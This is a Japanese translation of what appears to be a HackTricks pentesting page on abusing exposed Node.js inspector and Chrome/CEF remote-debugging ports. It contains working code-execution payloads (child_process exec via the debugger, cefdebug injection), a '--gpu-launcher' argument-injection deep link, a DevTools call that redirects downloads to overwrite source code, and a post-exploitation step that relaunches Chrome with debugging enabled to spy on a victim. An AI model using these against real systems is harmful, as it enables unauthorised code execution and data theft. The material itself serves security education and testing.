# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

[ドキュメントより](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` スイッチを指定して起動すると、Node.js プロセスは debugging client の接続を待ち受けます。**デフォルト**では、ホストおよびポート **`127.0.0.1:9229`** で待ち受けます。各プロセスには **一意の** **UUID** も割り当てられます。

Inspector clients は接続するために、ホストアドレス、ポート、UUID を把握して指定する必要があります。完全な URL は次のようになります: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。

> [!WARNING]
> **debugger は Node.js の実行環境に完全にアクセスできる**ため、このポートに接続できる悪意のある攻撃者は、Node.js プロセスに代わって任意のコードを実行できる可能性があります（**権限昇格の可能性**）。

Inspector を起動する方法はいくつかあります:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
検査対象のプロセスを開始すると、次のような表示が現れます：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) ベースのプロセスでは、**debugger** を開くために `--remote-debugging-port=9222` パラメータを使用する必要があります（SSRF 保護は非常によく似ています）。ただし、**NodeJS** の **debug** セッションを許可する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的な RCE はありません。

debug 対応ブラウザを起動すると、次のようなものが表示されます：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers、WebSockets、same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browserで開かれたWebサイトは、browser security modelの下でWebSocketおよびHTTPリクエストを実行できます。**一意のdebugger session idを取得する**には、**初期HTTP接続**が必要です。**same-origin-policy**により、Webサイトが**このHTTP接続**を実行することは**防止されます**。さらに[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**に対する**securityを強化するため、Node.jsは接続の**'Host' headers**が正確に**IP address**、**`localhost`**、または**`localhost6`**のいずれかを指定していることを検証します。

> [!TIP]
> この**security measuresにより、単にHTTP requestを送信するだけで**（SSRF vulnを悪用すれば可能）**inspectorをexploitしてcodeを実行することが防止されます**。

### 実行中のprocessesでinspectorを開始する

実行中のnodejs processに**signal SIGUSR1**を送信すると、default portで**inspectorを開始**できます。ただし、十分なprivilegesが必要なため、これは**process内部の情報へのprivileged access**を与える可能性がありますが、直接的なprivilege escalationにはなりません。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> これはコンテナで便利です。なぜなら、`--inspect` を使用して**プロセスをシャットダウンし、新しいプロセスを起動すること**は、**コンテナ**がプロセスとともに**停止される**ため、**選択肢にならない**からです。

### inspector/debuggerに接続する

**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdgeで、それぞれ`chrome://inspect`または`edge://inspect` URLにアクセスできます。Configureボタンをクリックし、**対象ホストとポートが**正しく一覧表示されていることを確認します。画像はRemote Code Execution（RCE）の例です：

![デバッガーにアクセスするURLが表示されます。例：ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debuggerに接続する：Chromiumベースのブラウザに接続するには、...](<../../images/image (674).png>)

**コマンドライン**を使用すると、次の方法でdebugger/inspectorに接続できます：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
この tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) を使うと、ローカルで実行中の **inspectors** を**検出**し、それらに **code** を**inject**できます。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由で browser に接続している場合、**NodeJS RCE exploits** は機能しないことに注意してください（API を確認して、実行できる興味深いことを見つける必要があります）。

## NodeJS Debugger/Inspector における RCE

> [!TIP]
> [**Electron の XSS から RCE を取得する方法を探している場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node **inspector** に **connect** できる場合に **RCE** を取得する一般的な方法として、次のようなものがあります（**Chrome DevTools protocol** への connection では機能しないようです）。
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API はここで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
このセクションでは、この protocol を exploit するために人々が使用した興味深い手法を列挙します。

### Deep Links 経由の Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) で、Rhino security は、CEF ベースの application がシステムにカスタム UR**I を登録**していることを発見しました（workspaces://index.html）。この URI は完全な URI を受け取り、その URI から部分的に構築した configuration で CEF ベースの applicatio**n を起動**していました。

URI の parameters が URL decoded され、CEF basic application の起動に使用されていることが判明しました。これにより、user は **`--gpu-launcher`** flag を **command line** に **inject** して、任意の処理を実行できました。

そのため、次のような payload になります:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exeを実行します。

### ファイルの上書き

**ダウンロードしたファイルの保存先**フォルダを変更し、ファイルをダウンロードして、アプリケーションで頻繁に使用される**ソースコード**を**悪意のあるコード**で上書きします。
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

この投稿: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) によると、theriver から RCE を取得し、内部ページを exfiltrate することが可能です。

### Post-Exploitation

実際の環境で、Chrome/Chromium ベースの browser を使用しているユーザー PC を**compromising した後**、**debugging を有効化し、debugging port を port-forward** した状態で Chrome process を起動し、アクセスできるようにすることが可能です。これにより、**victim が Chrome で行うすべての操作を inspect し、sensitive information を steal できる**ようになります。

stealth な方法は、**すべての Chrome process を terminate** してから、次のようなものを呼び出すことです。
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考資料

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
